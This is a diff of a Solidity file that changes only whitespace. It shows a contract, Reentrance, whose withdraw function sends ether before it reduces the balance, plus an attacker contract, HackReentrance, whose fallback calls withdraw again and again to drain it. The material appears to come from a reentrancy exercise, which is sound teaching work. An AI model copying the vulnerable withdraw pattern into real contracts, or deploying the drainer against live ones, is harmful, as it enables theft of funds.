@@ -4,7 +4,6 @@ pragma solidity ^0.8.17;
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
 contract Reentrance {
-
     using SafeMath for uint256;
     mapping(address => uint) public balances;
 
@@ -17,13 +16,13 @@ contract Reentrance {
     }
 
     function withdraw(uint _amount) public {
-        if(balances[msg.sender] >= _amount) {
-            (bool result,) = msg.sender.call{value:_amount}("");
-            if(result) {
+        if (balances[msg.sender] >= _amount) {
+            (bool result, ) = msg.sender.call{value: _amount}("");
+            if (result) {
                 _amount;
             }
             unchecked {
-              balances[msg.sender] -= _amount;
+                balances[msg.sender] -= _amount;
             }
         }
     }
@@ -48,7 +47,7 @@ contract HackReentrance {
     }
 
     fallback() external payable {
-        if(reentrance.balance != 0) {
+        if (reentrance.balance != 0) {
             Reentrance(reentrance).withdraw(AMOUNT);
         }
     }
